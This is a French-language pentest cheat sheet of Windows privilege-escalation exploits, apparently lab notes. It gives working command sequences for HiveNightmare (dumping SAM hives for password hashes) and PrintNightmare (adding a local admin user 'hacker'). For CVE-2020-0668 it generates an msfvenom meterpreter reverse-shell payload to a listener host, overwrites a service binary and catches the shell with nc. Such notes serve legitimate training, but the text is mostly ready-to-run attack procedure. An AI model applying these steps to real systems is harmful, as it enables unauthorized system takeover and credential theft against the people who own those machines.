
# Kernel Exploits


> [!TIP]
> Rechercher des CVEs sur le kernel -> WES


- [[#CVE-2021-36934 HiveNightmare]]
- [[#CVE-2021-1675/CVE-2021-34527 PrintNightmare]]
- [[#CVE-2020-0668]]



## CVE-2021-36934 HiveNightmare

https://github.com/GossiTheDog/HiveNightmare

> [!TIP]
> Vulnérable si le user peut lire la base SAM en registre.
> Permet de dump les ruches et extraire les hashes


Identifier les ACL sur le fichier SAM

```cmd
icacls c:\Windows\System32\config\SAM
```

### HiveNightmare

Extraire les ruches

```powershell
.\HiveNightmare.exe
```


## CVE-2021-1675/CVE-2021-34527 PrintNightmare

> [!TIP]
> Permet d'ajouter un driver malicieux en exploitant le spooler d'impression.

https://github.com/calebstewart/CVE-2021-1675


1. Vérifier si le spooler d'impression tourne (path does not exist si ne tourne pas)

```powershell-session
ls \\localhost\pipe\spoolss
```

2. Bypass politique d'execution de scripts

```powershell-session
Set-ExecutionPolicy Bypass -Scope Process
```

3. Importer le module et l'invoquer pour ajouter un user au group admin local

```powershell-session
Import-Module .\CVE-2021-1675.ps1
Invoke-Nightmare -NewUser "hacker" -NewPassword "Pwnd1234!" -DriverName "PrintIt"
```

4. Confirmer l'ajout du user

```powershell-session
net user hacker
```


## CVE-2020-0668

> [!TIP]
> Permet de déplacer des fichiers en tant que SYSTEM et de les lire grace au Windows Service Tracing.

https://github.com/RedCursorSecurityConsulting/CVE-2020-0668

1. Compiler le PoC.

2. Vérifier ACL sur "c:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"

```cmd
icacls "c:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"
```

3. Créer binaire reverse shell

```shell
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.3 LPORT=8443 -f exe > maintenanceservice.exe
```

4. Transférer 2 versions de la charge créée précédemment

5. Run exploit

```cmd-session
C:\Tools\CVE-2020-0668\CVE-2020-0668.exe C:\Users\htb-student\Desktop\maintenanceservice.exe "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"
```


5. Vérifier ACL sur le fichier cible (F)

```cmd-session
icacls 'C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe'
```

6. Copier la 2e version de la charge transférée vers le fichier cible

```cmd-session
copy /Y C:\Users\htb-student\Desktop\maintenanceservice2.exe "c:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"
```

7. Lancer Listener

```bash
nc -lvnp 8443
```

8. Lancer service

```cmd-session
net start MozillaMaintenance 
```

